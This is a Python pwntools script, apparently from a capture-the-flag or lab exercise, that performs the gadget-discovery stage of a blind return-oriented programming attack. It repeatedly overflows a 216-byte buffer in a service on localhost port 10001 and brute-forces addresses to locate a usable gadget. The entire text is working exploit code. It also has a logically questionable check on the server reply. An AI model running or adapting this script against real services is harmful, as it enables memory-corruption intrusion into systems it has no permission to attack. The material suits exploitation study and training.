#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
def get_brop_gadget(length, stop_gadget, addr):
	try:
		sh = remote('127.0.0.1', 10001)
		sh.recvuntil('Please tell me:')
		payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(
			stop_gadget) + p64(0) * 10
		sh.sendline(payload)
		sh.recv()
		content = sh.recv()
		sh.close()
		print content
		# stop gadget returns memory
		if not content.find('Hello'):
			return False
		return True
	except Exception:
		sh.close()
		return False

def check_brop_gadget(length, addr):
	try:
		sh = remote('127.0.0.1', 10001)
		sh.recvuntil('Please tell me:')
		payload = 'a' * length + p64(addr) + 'a' * 8 * 10
		sh.sendline(payload)
		sh.recv()
		content = sh.recv()
		sh.close()
		return False
	except Exception:
		sh.close()
		return True

length = 216
stop_gadget = 0x4007d6
addr = 0x4007d6#libc_scu_init is behind from main
while 1:
	print hex(addr)
	if get_brop_gadget(length, stop_gadget, addr):
		print 'possible brop gadget: 0x%x' % addr
		if check_brop_gadget(length, addr):
			print 'success brop gadget: 0x%x' % addr
			break
	addr += 1
#0x40095a